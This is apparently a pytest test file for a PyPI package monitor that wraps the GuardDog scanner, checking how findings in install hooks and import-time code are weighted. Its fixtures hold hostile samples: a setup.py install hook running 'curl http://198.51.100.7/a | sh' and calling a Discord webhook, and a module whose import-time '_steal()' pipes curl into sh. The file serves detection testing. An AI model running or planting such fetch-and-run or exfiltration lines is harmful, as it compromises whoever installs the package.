from pathlib import Path

import pytest

from pypi_monitor.analyzers import ReleaseContext
from pypi_monitor.analyzers.guarddog import GuardDogAnalyzer, normalize_results
from pypi_monitor.domain import Severity

# The address is from a documentation range and the file is only ever scanned as text.
MALICIOUS_SETUP = """
import base64, os, urllib.request
from setuptools import setup
from setuptools.command.install import install

class Install(install):
    def run(self):
        os.system("curl http://198.51.100.7/a | sh")
        urllib.request.urlopen("https://discord.com/api/webhooks/1/abc")

setup(name="evil", cmdclass={"install": Install})
"""


def test_guarddog_findings_become_signals(tmp_path: Path) -> None:
    (tmp_path / "evil-1.0").mkdir()
    (tmp_path / "evil-1.0/setup.py").write_text(MALICIOUS_SETUP)
    context = ReleaseContext(name="evil", version="1.0", artifact_dir=tmp_path)

    signals = GuardDogAnalyzer().analyze(context)

    by_rule = {signal.rule_id: signal for signal in signals}
    threat = by_rule["guarddog.install.threat-network-exfil-messenger"]
    assert threat.severity is Severity.HIGH
    assert threat.file_path is not None
    assert threat.file_path.endswith("evil-1.0/setup.py")
    assert threat.line is not None
    assert "discord.com" in threat.evidence
    assert by_rule["guarddog.capability-process-spawn"].severity is Severity.LOW


def threat_at(tmp_path: Path, path: str, line: int = 1, source: str = "x = 1\n") -> str:
    """The rule a threat finding at `path` gets; the file exists, as GuardDog found it there."""
    target = tmp_path / path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(source)
    results = {"threat-x": [{"location": f"{path}:{line}", "message": "m"}]}
    signal = normalize_results(results, {}, tmp_path)[0]
    if signal.rule_id.startswith("guarddog.install."):
        assert signal.confidence == pytest.approx(0.7)
    else:
        assert signal.confidence == pytest.approx(0.14)
    return signal.rule_id


@pytest.mark.parametrize(
    "path",
    [
        "a.tar.gz/a-1.0/setup.py",
        "a.whl/a/__init__.py",
        "a.tar.gz/a-1.0/a/__init__.py",
        "a.tar.gz/a-1.0/src/a/__init__.py",
        "a.whl/evil.pth",
        "a.whl/a-1.0.data/purelib/a/__init__.py",
        "a.whl/a-1.0.data/platlib/a/__init__.py",
        "a.whl/sitecustomize.py",
        "a.whl/a-1.0.data/purelib/usercustomize.py",
    ],
)
def test_threats_in_code_that_runs_by_itself_keep_their_weight(path: str, tmp_path: Path) -> None:
    assert threat_at(tmp_path, path) == "guarddog.install.threat-x"


@pytest.mark.parametrize(
    "path",
    [
        "a.whl/a/cli.py",
        "a.tar.gz/a-1.0/a/b/c/__init__.py",
        "a.tar.gz/a-1.0/tests/fixtures/setup.py",
        "a.tar.gz/a-1.0/a/sitecustomize.py",
    ],
)
def test_threats_in_ordinary_modules_are_discounted(path: str, tmp_path: Path) -> None:
    assert threat_at(tmp_path, path) == "guarddog.threat-x"


PAYLOAD = """import os


def helper():
    return 1


def _steal():
    os.system("curl x | sh")


_steal()

if __name__ == "__main__":
    os.system("y")
"""


def test_a_module_imported_on_start_runs_by_itself_in_its_import_time_lines(
    tmp_path: Path,
) -> None:
    (tmp_path / "a.whl/a").mkdir(parents=True)
    (tmp_path / "a.whl/a/__init__.py").write_text("from ._core import helper\n")

    assert threat_at(tmp_path, "a.whl/a/_core.py", 9, PAYLOAD) == "guarddog.install.threat-x"
    # Neither a function nobody calls on import nor the `__main__` block runs.
    assert threat_at(tmp_path, "a.whl/a/_core.py", 5, PAYLOAD) == "guarddog.threat-x"
    assert threat_at(tmp_path, "a.whl/a/_core.py", 15, PAYLOAD) == "guarddog.threat-x"


def test_the_import_graph_follows_chains_and_setup_py(tmp_path: Path) -> None:
    root = tmp_path / "a.tar.gz/a-1.0"
    (root / "src/a/sub").mkdir(parents=True)
    (root / "setup.py").write_text("def version():\n    from a.sub import meta\n")
    (root / "src/a/__init__.py").write_text("")
    (root / "src/a/sub/__init__.py").write_text("from . import deep\n")
    (root / "src/a/sub/deep.py").write_text("import os\nos.system('x')\n")

    assert threat_at(
        tmp_path, "a.tar.gz/a-1.0/src/a/sub/deep.py", 2, "import os\nos.system('x')\n"
    ) == ("guarddog.install.threat-x")
    assert threat_at(tmp_path, "a.tar.gz/a-1.0/src/a/sub/meta.py", 1) == "guarddog.install.threat-x"


def test_a_module_nothing_imports_on_start_is_ordinary(tmp_path: Path) -> None:
    (tmp_path / "a.whl/a").mkdir(parents=True)
    (tmp_path / "a.whl/a/__init__.py").write_text("def lazy():\n    from . import _core\n")

    assert threat_at(tmp_path, "a.whl/a/_core.py", 9, PAYLOAD) == "guarddog.threat-x"


def test_clean_code_gives_no_threats(tmp_path: Path) -> None:
    (tmp_path / "module.py").write_text("def add(a, b):\n    return a + b\n")
    context = ReleaseContext(name="ok", version="1.0", artifact_dir=tmp_path)

    assert GuardDogAnalyzer().analyze(context) == []


def test_missing_artifact_is_an_error_not_a_clean_result() -> None:
    with pytest.raises(ValueError, match="no unpacked artifact"):
        GuardDogAnalyzer().analyze(ReleaseContext(name="x", version="1"))


def test_normalization_caps_noisy_rules_and_survives_odd_locations(tmp_path: Path) -> None:
    results = {
        "quiet": {},
        "noisy": [{"location": f"a.py:{i}", "code": "c", "message": "m"} for i in range(1, 50)],
        "odd": [{"location": "no-line", "code": "c", "message": "m"}, {"message": "m"}],
    }

    signals = normalize_results(results, {}, tmp_path)

    assert sum(signal.rule_id == "guarddog.noisy" for signal in signals) == 10
    odd = [signal for signal in signals if signal.rule_id == "guarddog.odd"]
    assert [(s.file_path, s.line) for s in odd] == [("no-line", None), (None, None)]
